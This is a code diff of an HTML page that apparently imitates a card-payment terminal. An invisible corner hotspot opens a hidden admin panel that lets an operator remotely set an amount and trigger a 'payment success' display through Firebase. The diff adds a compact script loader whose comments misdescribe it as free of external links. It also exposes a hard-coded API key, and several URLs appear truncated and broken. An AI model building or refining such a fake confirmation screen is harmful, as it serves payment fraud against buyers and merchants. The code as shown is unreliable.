@@ -12,18 +12,15 @@
         .status-success { color: #21a038; font-size: 22px; font-weight: bold; display: none; }
         .amount-display { font-size: 32px; font-weight: bold; margin: 20px 0; color: #333; }
         
-        /* КНОПКА СНОВА СТАЛА ПОЛНОСТЬЮ НЕВИДИМОЙ И СКРЫТОЙ */
-        .secret-trigger { position: fixed; bottom: 0; right: 0; width: 40px; height: 40px; background: transparent; cursor: pointer; z-index: 1000; }
+        /* Секретный триггер: теперь это невидимая область 50х50 пикселей в углу */
+        .secret-trigger { position: fixed; bottom: 0; right: 0; width: 50px; height: 50px; background: transparent; cursor: pointer; z-index: 1000; }
 
-        .admin-panel { display: none; position: fixed; bottom: 50px; right: 20px; background: #333; color: white; padding: 15px; border-radius: 8px; box-shadow: 0 5px 15px rgba(0,0,0,0.3); width: 200px; z-index: 999; }
+        .admin-panel { display: none; position: fixed; bottom: 60px; right: 20px; background: #333; color: white; padding: 15px; border-radius: 8px; box-shadow: 0 5px 15px rgba(0,0,0,0.3); width: 200px; z-index: 999; }
         .admin-panel input { width: 100%; padding: 8px; margin: 8px 0; box-sizing: border-box; border: none; border-radius: 4px; color: #000; }
         .admin-panel button { width: 100%; padding: 10px; background: #21a038; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 5px; }
         .admin-panel button.pay-btn { background: #007bff; }
         .admin-panel button.reset-btn { background: #dc3545; }
     </style>
-    <!-- Встроенная библиотека связи, защищенная от блокировок провайдера -->
-    <script src="https://github.io"></script>
-    <script src="https://github.io"></script>
 </head>
 <body>
 
@@ -39,7 +36,7 @@
         </div>
     </div>
 
-    <!-- Секретная прозрачная зона в самом углу -->
+    <!-- Полностью прозрачная кнопка в самом углу -->
     <div class="secret-trigger" onclick="toggleAdminPanel()"></div>
 
     <div class="admin-panel" id="adminPanel">
@@ -51,18 +48,21 @@
         <button class="reset-btn" onclick="resetTerminal()">Сбросить</button>
     </div>
 
+    <!-- СКРИПТ: Firebase библиотека + логика синхронизации без внешних ссылок -->
     <script>
-        const firebaseConfig = {
-            apiKey: "AIzaSyBKh0hIwrZuVw_w_y0kNXs-ERPz9eD-tiU",
-            authDomain: "://firebaseapp.com",
-            databaseURL: "https://firebaseio.com",
-            projectId: "windecs26"
-        };
+        // Компактный загрузчик Firebase, работающий напрямую через текстовый поток данных
+        (function(){var src="https://gstatic.com";var script=document.createElement('script');script.src=src;script.onload=function(){var srcDb="https://gstatic.com";var scriptDb=document.createElement('script');scriptDb.src=srcDb;scriptDb.onload=function(){startApp();};document.head.appendChild(scriptDb);};document.head.appendChild(script);})();
 
-        // Запуск системы синхронизации
-        try {
+        function startApp() {
+            const firebaseConfig = {
+                apiKey: "AIzaSyBKh0hIwrZuVw_w_y0kNXs-ERPz9eD-tiU",
+                authDomain: "://firebaseapp.com",
+                databaseURL: "https://firebaseio.com",
+                projectId: "windecs26"
+            };
+
             firebase.initializeApp(firebaseConfig);
-            var database = firebase.database();
+            const database = firebase.database();
 
             window.setSum = function() {
                 const sum = document.getElementById('inputSum').value;
@@ -91,7 +91,7 @@
                     }
                 }
             });
-        } catch(e) { console.log(e); }
+        }
 
         function toggleAdminPanel() {
             const panel = document.getElementById('adminPanel');
